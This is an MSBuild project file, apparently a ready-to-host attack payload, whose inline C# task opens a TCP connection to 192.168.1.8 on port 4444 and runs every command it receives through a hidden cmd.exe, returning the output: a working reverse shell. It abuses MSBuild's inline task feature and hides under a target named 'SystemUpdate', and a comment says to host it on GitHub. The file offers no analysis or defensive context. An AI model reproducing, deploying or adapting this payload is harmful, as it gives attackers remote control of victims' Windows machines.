<!-- payload.xml - Host this on GitHub -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"><Target Name="SystemUpdate"><ReverseShellTask /></Target>

  <UsingTask TaskName="ReverseShellTask" TaskFactory="CodeTaskFactory"AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"><Task><Code Type="Class" Language="cs"><![CDATA[
        using System;
        using System.Net.Sockets;
        using System.Diagnostics;
        using System.Text;

        public class ReverseShellTask : Microsoft.Build.Utilities.Task {
            public override bool Execute() {
                string host = "192.168.1.8";  // ← Easy to update!
                int port = 4444;

                using(TcpClient client = new TcpClient(host, port)) {
                    using(System.IO.Stream stream = client.GetStream()) {
                        byte[] bytes = new byte[65536];
                        int bytesRead;

                        while((bytesRead = stream.Read(bytes, 0, bytes.Length)) != 0) {
                            string data = Encoding.ASCII.GetString(bytes, 0, bytesRead);
                            string output = ExecuteCommand(data);
                            byte[] msg = Encoding.ASCII.GetBytes(output);
                            stream.Write(msg, 0, msg.Length);
                        }
                    }
                }
                return true;
            }

            private string ExecuteCommand(string command) {
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/c " + command;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();

                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
                return output;
            }
        }
        ]]>
      </Code></Task></UsingTask></Project>
